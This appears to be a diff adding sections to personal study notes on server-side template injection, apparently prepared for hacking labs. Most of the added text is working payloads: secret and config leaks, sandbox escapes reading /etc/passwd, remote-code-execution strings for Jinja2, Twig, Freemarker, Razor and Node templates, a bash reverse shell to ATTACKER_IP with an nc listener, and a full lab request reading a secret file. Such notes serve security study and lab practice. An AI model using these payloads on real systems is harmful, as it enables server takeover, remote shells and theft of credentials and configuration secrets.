@@ -96,8 +96,6 @@ HTTP/1.1 200 OK
 
 In this response, we see an object named config and sensitive information within it, such as SECRET_KEY.
 
-
-
 * where to look for SSTI vulns
 SSTI vulnerabilities can be found anywhere user input is included in a server-side template. Common places to check include:
 
@@ -115,3 +113,155 @@ Cookie values used for personalization, such as welcome_message.
 
 *file uploads* ->
 The names of uploaded files might be used in a templated "successfully uploaded" message.
+
+* accessing sensitive information
+After inspecting the context, we can directly read sensitive information by accessing the attributes and methods of the discovered objects.
+
+ Let's use the config object we discovered in the previous example.
+
+#+begin_src python
+GET /profile?name={{config.SECRET_KEY}} HTTP/1.1
+Host: vulnerable-site.com
+...
+#+end_src
+
+*response* ->
+#+begin_src python
+HTTP/1.1 200 OK
+...
+
+<h1>Welcome, s3cr3t_valu3!</h1>
+#+end_src
+
+This method can be used to leak API keys, database passwords, secret salt values, and other configuration secrets.
+
+* calling object methods
+Template engines may allow not only accessing object attributes but also calling their methods. This significantly expands the scope of the vulnerability.
+
+For example, if there is a user object and it has a method like getPassword(), we can call it.
+
+#+begin_src python
+GET /profile?name={{user.getPassword()}} HTTP/1.1
+Host: vulnerable-site.com
+...
+#+end_src
+
+* escaping the sandbox and reading files
+More complex exploits aim to escape the sandbox environment created by the template engine for security.
+
+The sandbox is designed to prevent access to dangerous functions like os.system. However, in many template engines, there are ways to bypass this sandbox
+
+In Python-based template engines (like Jinja2), this is usually done by climbing up Python's object model hierarchy. The goal is to reach the fundamental Python built-in functions.
+
+The following payload can be used in Jinja2 to escape the sandbox and read the /etc/passwd file on the server:
+
+:  {{ self.__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }}
+
+#+begin_src python
+GET /profile?name={{ self.__init__.__globals__['__builtins__']['open']('/etc/passwd').read() }} HTTP/1.1
+Host: vulnerable-site.com
+...
+#+end_src
+
+* escalating to RCE
+The most dangerous consequence of an SSTI vulnerability is achieving Remote Code Execution (RCE), which allows an attacker to run arbitrary commands on the server.
+
+** RCE in jinja2 envs
+Achieving RCE in Python-based template engines typically involves accessing dangerous functions like __import__ or eval through the __builtins__ module.
+
+One of the most common methods is to import the os module and use its popen() or system() functions.
+
+: {{ self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
+
+#+begin_src python
+GET /profile?name={{ self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }} HTTP/1.1
+Host: vulnerable-site.com
+...
+#+end_src
+
+** php (twig) envs
+The PHP-based template engine Twig has a fairly secure sandbox by default. However, developers may sometimes make dangerous functions like registerUndefinedFilterCallback accessible within templates or misconfigure the environment.
+
+If PHP functions such as exec, system, or passthru are directly or indirectly accessible, it is possible to achieve Remote Code Execution (RCE).
+
+: {{ ['id']|filter('system') }}
+
+#+begin_src python
+GET /profile?name={{ ['id']|filter('system') }} HTTP/1.1
+Host: vulnerable-site.com
+...
+#+end_src
+
+The following example assumes that the passthru function is already registered as a filter named passthru. In this case, the passthru filter directly invokes PHPs passthru() function.
+#+begin_src python
+GET /profile?name={{ "ls -la"|passthru }} HTTP/1.1
+Host: vulnerable-site.com
+...
+#+end_src
+
+chieving RCE in Twig heavily depends on how the Twig environment is configured and is generally harder compared to Jinja2.
+
+** java (freemarker) envs
+Freemarker provides a path to RCE when dangerous objects like Execute can be accessed.
+: <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id") }
+
+This payload creates a new object from the freemarker.template.utility.Execute class and assigns it to the ex variable. It then uses this object to run the id command.
+
+** .NET (Razor) envs
+The Razor template engine can directly execute C# code, making command execution quite straightforward.
+: @{ System.Diagnostics.Process.Start("cmd.exe","/c whoami"); }
+
+This payload uses .NET's Process.Start method to execute the whoami command.
+
+** NodeJS (Plug/Jade) envs
+NodeJS-based template engines can allow RCE by accessing NodeJS's global process object.
+
+: #{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
+
+This payload loads the child_process module to execute cat /etc/passwd synchronously and outputs the result.
+
+** reverse shell
+Once RCE access is achieved, attackers often aim to get a more stable and interactive command-line session via a reverse shell. This allows the vulnerable server to connect back to an attacker-controlled machine and open a shell session.
+
+: nc -lvp 4444
+
+The attacker sends a payload to make the target server connect back to their machine.
+
+: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+
+This payload can be embedded into the RCE technique seen earlier:
+#+begin_src python
+{{ ['bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1']|filter('system') }}
+#+end_src
+
+When executed, the vulnerable server will connect to the attacker's machine on port 4444, giving the attacker shell access via the nc listener.
+
+* machine lab
+
+*payload to solve* ->
+:  {{ self.__init__.__globals__['__builtins__']['__import__']('os').popen('cat /etc/passwd').read() }}
+
+#+begin_src python
+POST /create_invoice HTTP/1.1
+Host: invoicepanel.hv
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200
+Origin: http://invoicepanel.hv
+Connection: keep-alive
+Referer: http://invoicepanel.hv/create_invoice
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+name=%7B%7B+7+*+7+%7D%7D&address=%20%7b%7b%20self.__init__.__globals__%5b'__builtins__'%5d%5b'__import__'%5d('os').popen('cat%20%2fhome%2fsecret.txt').read()%20%7d%7d&items=%7B%7B+7+*+7+%7D%7D&total=2
+#+end_src
+
+* basic SSTI
+This lab contains a Server-Side Template Injection (SSTI) vulnerability in a PHP-based web application that uses the Twig template engine.
+
+To complete the lab, exploit the SSTI vulnerability in the search box to access the contents of the config.php file.
+
+What is the database password in config.php?
